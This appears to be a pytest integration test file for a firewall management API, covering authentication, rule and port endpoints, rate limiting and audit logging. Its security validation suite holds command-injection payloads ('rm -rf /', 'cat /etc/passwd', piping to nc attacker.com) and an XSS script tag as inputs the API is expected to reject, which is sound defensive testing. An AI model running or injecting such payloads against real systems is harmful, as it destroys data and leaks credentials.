"""
Integration Tests for Firewall Management API Endpoints
Tests real HTTP endpoints with authentication and database integration

Test Categories:
- API Authentication & Authorization
- Firewall Status Endpoints
- Rule CRUD Endpoints
- Port Management Endpoints
- Bulk Operations
- Error Responses
- Rate Limiting
- Audit Logging
"""
import pytest
import httpx
from typing import Dict, Any
import time
import asyncio


# ==================== FIXTURES ====================

@pytest.fixture
async def base_url():
    """Base URL for Ops-Center API"""
    return "http://localhost:8084"


@pytest.fixture
async def admin_client(base_url):
    """Create authenticated admin client"""
    async with httpx.AsyncClient(base_url=base_url, timeout=10.0) as client:
        # Login as admin
        response = await client.post("/api/v1/auth/login", json={
            "username": "admin_test",
            "password": "Test123!"
        })

        if response.status_code == 200:
            token = response.json().get("access_token")
            client.headers["Authorization"] = f"Bearer {token}"

        yield client


@pytest.fixture
async def viewer_client(base_url):
    """Create authenticated viewer (non-admin) client"""
    async with httpx.AsyncClient(base_url=base_url, timeout=10.0) as client:
        # Login as viewer
        response = await client.post("/api/v1/auth/login", json={
            "username": "user_test",
            "password": "Test123!"
        })

        if response.status_code == 200:
            token = response.json().get("access_token")
            client.headers["Authorization"] = f"Bearer {token}"

        yield client


@pytest.fixture
async def unauthenticated_client(base_url):
    """Create client without authentication"""
    async with httpx.AsyncClient(base_url=base_url, timeout=10.0) as client:
        yield client


@pytest.fixture(autouse=True)
async def cleanup_test_rules(admin_client):
    """Cleanup test rules after each test"""
    yield

    # Delete all test rules (those with "TEST:" in comment)
    try:
        response = await admin_client.get("/api/v1/network/firewall/rules")
        if response.status_code == 200:
            rules = response.json().get("rules", [])

            for rule in rules:
                comment = rule.get("comment", "")
                if comment and "TEST:" in comment:
                    rule_id = rule.get("rule_id")
                    if rule_id:
                        await admin_client.delete(
                            f"/api/v1/network/firewall/rules/{rule_id}"
                        )
    except Exception as e:
        print(f"Cleanup error: {e}")


# ==================== TEST SUITE 1: AUTHENTICATION & AUTHORIZATION ====================

class TestAuthentication:
    """API Authentication & Authorization Tests"""

    @pytest.mark.asyncio
    async def test_unauthenticated_request_rejected(self, unauthenticated_client):
        """TC-4.6: Authentication Required Test"""
        response = await unauthenticated_client.get(
            "/api/v1/network/firewall/status"
        )

        assert response.status_code == 401
        data = response.json()
        assert "error" in data or "detail" in data

    @pytest.mark.asyncio
    async def test_viewer_cannot_modify_firewall(self, viewer_client):
        """TC-4.7: Authorization Test (Admin Role Required)"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 8080,
            "comment": "TEST: Unauthorized attempt"
        }

        response = await viewer_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 403 Forbidden
        assert response.status_code == 403
        data = response.json()
        assert "error" in data or "detail" in data

    @pytest.mark.asyncio
    async def test_admin_can_modify_firewall(self, admin_client):
        """Verify admin has access to firewall management"""
        response = await admin_client.get("/api/v1/network/firewall/status")

        # Admin should have access (200 or 503 if UFW not configured)
        assert response.status_code in [200, 503]


# ==================== TEST SUITE 2: FIREWALL STATUS ENDPOINTS ====================

class TestFirewallStatusAPI:
    """TC-1.1 through TC-1.8: Firewall Status API Tests"""

    @pytest.mark.asyncio
    async def test_get_firewall_status(self, admin_client):
        """TC-1.1: GET /api/v1/network/firewall/status"""
        response = await admin_client.get("/api/v1/network/firewall/status")

        # 200 if UFW configured, 503 if not installed
        assert response.status_code in [200, 503]

        if response.status_code == 200:
            data = response.json()

            # Verify response structure
            assert "enabled" in data
            assert isinstance(data["enabled"], bool)

            if "default_incoming" in data:
                assert data["default_incoming"] in ["allow", "deny"]

            if "rules_count" in data:
                assert isinstance(data["rules_count"], int)
                assert data["rules_count"] >= 0

    @pytest.mark.asyncio
    async def test_enable_firewall(self, admin_client):
        """TC-1.2: POST /api/v1/network/firewall/enable"""
        response = await admin_client.post("/api/v1/network/firewall/enable")

        # Should succeed or return error if not configured
        assert response.status_code in [200, 500, 503]

        if response.status_code == 200:
            data = response.json()
            assert "success" in data or "message" in data

    @pytest.mark.asyncio
    async def test_disable_firewall(self, admin_client):
        """TC-1.3: POST /api/v1/network/firewall/disable"""
        response = await admin_client.post("/api/v1/network/firewall/disable")

        # Should succeed or return error if not configured
        assert response.status_code in [200, 500, 503]

        if response.status_code == 200:
            data = response.json()
            assert "warning" in data or "message" in data


# ==================== TEST SUITE 3: RULE CRUD ENDPOINTS ====================

class TestFirewallRulesAPI:
    """TC-2.1 through TC-2.12: Rule Management API Tests"""

    @pytest.mark.asyncio
    async def test_list_firewall_rules(self, admin_client):
        """TC-1.5: GET /api/v1/network/firewall/rules"""
        response = await admin_client.get("/api/v1/network/firewall/rules")

        assert response.status_code in [200, 503]

        if response.status_code == 200:
            data = response.json()
            assert "rules" in data
            assert isinstance(data["rules"], list)

    @pytest.mark.asyncio
    async def test_add_firewall_rule_allow(self, admin_client):
        """TC-2.1: POST /api/v1/network/firewall/rules (Allow)"""
        rule_data = {
            "action": "allow",
            "direction": "in",
            "protocol": "tcp",
            "port": 8080,
            "comment": "TEST: Web application"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should succeed or fail gracefully
        if response.status_code == 201:
            data = response.json()
            assert "rule_id" in data or "message" in data
        elif response.status_code == 503:
            # UFW not configured - expected in test environment
            pass
        else:
            # Other error - print for debugging
            print(f"Unexpected status: {response.status_code}, {response.text}")

    @pytest.mark.asyncio
    async def test_add_rule_deny(self, admin_client):
        """TC-2.2: POST /api/v1/network/firewall/rules (Deny)"""
        rule_data = {
            "action": "deny",
            "protocol": "tcp",
            "port": 3389,
            "comment": "TEST: Block RDP"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # 201 or 503 expected
        assert response.status_code in [201, 503]

    @pytest.mark.asyncio
    async def test_add_rule_with_source_ip(self, admin_client):
        """TC-2.3: POST /api/v1/network/firewall/rules (With Source IP)"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 5432,
            "source_ip": "192.168.1.0/24",
            "comment": "TEST: PostgreSQL (internal only)"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # 201 or 503 expected
        assert response.status_code in [201, 503]

    @pytest.mark.asyncio
    async def test_add_rule_invalid_port(self, admin_client):
        """TC-2.4: POST with Invalid Port"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 70000,  # Invalid
            "comment": "TEST: Invalid port"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 400 or 422
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_add_rule_invalid_ip(self, admin_client):
        """TC-2.5: POST with Invalid IP"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 8080,
            "source_ip": "999.999.999.999",  # Invalid
            "comment": "TEST: Invalid IP"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 400 or 422
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_delete_firewall_rule(self, admin_client):
        """TC-2.8: DELETE /api/v1/network/firewall/rules/{rule_id}"""
        # First create a test rule
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 9999,
            "comment": "TEST: To be deleted"
        }

        create_response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        if create_response.status_code == 201:
            data = create_response.json()
            rule_id = data.get("rule_id")

            if rule_id:
                # Now delete it
                delete_response = await admin_client.delete(
                    f"/api/v1/network/firewall/rules/{rule_id}"
                )

                assert delete_response.status_code in [200, 204]

    @pytest.mark.asyncio
    async def test_delete_nonexistent_rule(self, admin_client):
        """TC-5.4: DELETE Non-existent Rule"""
        response = await admin_client.delete(
            "/api/v1/network/firewall/rules/999999"
        )

        # Should return 404
        assert response.status_code == 404

    @pytest.mark.asyncio
    async def test_filter_rules_by_port(self, admin_client):
        """TC-1.7: GET /api/v1/network/firewall/rules?port=80"""
        response = await admin_client.get(
            "/api/v1/network/firewall/rules",
            params={"port": 80}
        )

        if response.status_code == 200:
            data = response.json()
            rules = data.get("rules", [])

            # All returned rules should have port 80
            for rule in rules:
                assert rule.get("port") == 80 or rule.get("port") == "80"

    @pytest.mark.asyncio
    async def test_filter_rules_by_protocol(self, admin_client):
        """TC-1.6: GET /api/v1/network/firewall/rules?protocol=tcp"""
        response = await admin_client.get(
            "/api/v1/network/firewall/rules",
            params={"protocol": "tcp"}
        )

        if response.status_code == 200:
            data = response.json()
            rules = data.get("rules", [])

            # All returned rules should be TCP
            for rule in rules:
                assert rule.get("protocol") == "tcp"


# ==================== TEST SUITE 4: PORT MANAGEMENT ====================

class TestPortManagementAPI:
    """TC-3.1 through TC-3.8: Port Management API Tests"""

    @pytest.mark.asyncio
    async def test_open_port(self, admin_client):
        """TC-3.1: POST /api/v1/network/firewall/ports/open"""
        port_data = {
            "port": 3000,
            "protocol": "tcp",
            "comment": "TEST: Node.js app"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/ports/open",
            json=port_data
        )

        # 201 or 503 expected
        assert response.status_code in [201, 503]

    @pytest.mark.asyncio
    async def test_close_port(self, admin_client):
        """TC-3.2: POST /api/v1/network/firewall/ports/close"""
        port_data = {
            "port": 3000,
            "protocol": "tcp"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/ports/close",
            json=port_data
        )

        # 200 or 503 expected
        assert response.status_code in [200, 503]

    @pytest.mark.asyncio
    async def test_check_port_status(self, admin_client):
        """TC-3.5: GET /api/v1/network/firewall/ports/{port}/status"""
        response = await admin_client.get(
            "/api/v1/network/firewall/ports/80/status"
        )

        # Should return status or 404
        assert response.status_code in [200, 404, 503]

    @pytest.mark.asyncio
    async def test_list_open_ports(self, admin_client):
        """TC-3.6: GET /api/v1/network/firewall/ports/open"""
        response = await admin_client.get("/api/v1/network/firewall/ports/open")

        if response.status_code == 200:
            data = response.json()
            assert "open_ports" in data or "ports" in data


# ==================== TEST SUITE 5: SECURITY VALIDATION ====================

class TestSecurityValidationAPI:
    """TC-4.1 through TC-4.10: Security Validation Tests"""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("malicious_port", [
        "8080; rm -rf /",
        "8080 && cat /etc/passwd",
        "8080 | nc attacker.com 1234",
        "8080`whoami`",
        "8080$(id)"
    ])
    async def test_command_injection_prevention_port(
        self, admin_client, malicious_port
    ):
        """TC-4.1: Command Injection Test (Port Parameter)"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": malicious_port,
            "comment": "TEST: Injection attempt"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 400 or 422
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_command_injection_prevention_ip(self, admin_client):
        """TC-4.2: Command Injection Test (IP Parameter)"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 8080,
            "source_ip": "192.168.1.1; cat /etc/passwd",
            "comment": "TEST: IP injection"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 400 or 422
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_xss_prevention_comment(self, admin_client):
        """TC-4.9: XSS Prevention in Comment"""
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 8080,
            "comment": "<script>alert('XSS')</script>"
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should accept but sanitize
        if response.status_code == 201:
            rule_id = response.json().get("rule_id")

            if rule_id:
                # Fetch rule and verify comment is escaped
                get_response = await admin_client.get(
                    f"/api/v1/network/firewall/rules/{rule_id}"
                )

                if get_response.status_code == 200:
                    rule = get_response.json()
                    comment = rule.get("comment", "")

                    # Should not contain raw script tags
                    assert "<script>" not in comment or "&lt;script&gt;" in comment


# ==================== TEST SUITE 6: RATE LIMITING ====================

class TestRateLimitingAPI:
    """TC-4.4, TC-4.5, TC-6.4: Rate Limiting Tests"""

    @pytest.mark.asyncio
    async def test_rate_limiting_firewall_changes(self, admin_client):
        """TC-4.4: Rate Limit Test (Firewall Changes)"""
        rule_template = {
            "action": "allow",
            "protocol": "tcp",
            "comment": "TEST: Rate limit test"
        }

        # Send 11 requests rapidly
        responses = []
        for i in range(11):
            rule_data = {**rule_template, "port": 9000 + i}
            response = await admin_client.post(
                "/api/v1/network/firewall/rules",
                json=rule_data
            )
            responses.append(response)

            # Small delay to avoid connection issues
            await asyncio.sleep(0.1)

        # Check if rate limiting is enforced
        rate_limited = any(r.status_code == 429 for r in responses)

        # If rate limiting is implemented, 11th request should be 429
        # If not implemented yet, all might succeed (503 if UFW not configured)
        if rate_limited:
            assert responses[10].status_code == 429
            data = responses[10].json()
            assert "rate limit" in str(data).lower()

    @pytest.mark.asyncio
    async def test_rate_limit_reset(self, admin_client):
        """TC-6.4: Rate Limit Reset"""
        # This test would need to wait 60+ seconds
        # Skipping in automated tests, but documenting structure
        pytest.skip("Rate limit reset test requires 60+ second wait")


# ==================== TEST SUITE 7: AUDIT LOGGING ====================

class TestAuditLoggingAPI:
    """TC-4.8: Audit Log Verification"""

    @pytest.mark.asyncio
    async def test_audit_log_created(self, admin_client):
        """TC-4.8: Verify Audit Log Entry Created"""
        # Add a rule
        rule_data = {
            "action": "allow",
            "protocol": "tcp",
            "port": 8888,
            "comment": "TEST: Audit log test"
        }

        create_response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        if create_response.status_code == 201:
            # Check audit logs
            audit_response = await admin_client.get(
                "/api/v1/network/audit-logs",
                params={"operation": "firewall_rule_add", "limit": 10}
            )

            if audit_response.status_code == 200:
                logs = audit_response.json().get("logs", [])

                # Should find our operation
                found = any(
                    log.get("operation") == "firewall_rule_add"
                    for log in logs
                )

                assert found, "Audit log entry not found"


# ==================== TEST SUITE 8: ERROR HANDLING ====================

class TestErrorHandlingAPI:
    """TC-5.1 through TC-5.8: Error Handling Tests"""

    @pytest.mark.asyncio
    async def test_invalid_json_payload(self, admin_client):
        """TC-5.5: Invalid JSON Payload"""
        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            content="{invalid json}",
            headers={"Content-Type": "application/json"}
        )

        # Should reject with 400 or 422
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_missing_required_fields(self, admin_client):
        """TC-5.6: Missing Required Fields"""
        rule_data = {
            "port": 8080
            # Missing: action, protocol
        }

        response = await admin_client.post(
            "/api/v1/network/firewall/rules",
            json=rule_data
        )

        # Should reject with 422
        assert response.status_code == 422


# Run with: pytest tests/integration/test_firewall_api.py -v --asyncio-mode=auto
